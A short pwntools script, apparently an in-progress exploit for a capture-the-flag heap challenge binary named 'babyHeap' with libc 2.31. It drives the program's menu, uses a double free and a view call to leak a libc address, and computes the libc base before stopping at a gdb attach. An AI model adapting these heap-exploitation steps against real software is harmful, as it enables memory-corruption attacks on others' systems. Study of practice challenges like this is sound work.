from pwn import *

elf = ELF("./babyHeap")
libc = ELF("libc-2.31.so")

target = elf.process()

def sla(s, d):
	target.sendlineafter(s, str(d))

def sa(s, d):
	target.sendafter(s, str(d))

LARGE = 1
MEDIUM = 2
SMALL = 3
def create(n, sz):
	sla(">>", 1)
	sla(":", n)
	sla(">>", sz)

def free():
	sla(">>", 2)

def edit(idx, data):
	sla(">>", 3)
	sla(":", idx)
	sla(":", 0x80)
	target.send(data)

def view(idx):
	sla(">>", 4)
	sla(": ", idx)

create(1, LARGE)
create(1, SMALL)
free()
free()
create(1, LARGE)
view(0)
libc.address = u64(target.recv(6).ljust(8, '\x00')) - 0x7f5baf852be0 + 0x00007f5baf667000
log.info("LIBC Base: " + hex(libc.address))

create(0x10, SMALL)
create(0xffffffff, 9008)

#free()
#free()

#edit(0xf, "A"*8)
gdb.attach(target, 'b __isoc99_scanf')

target.interactive()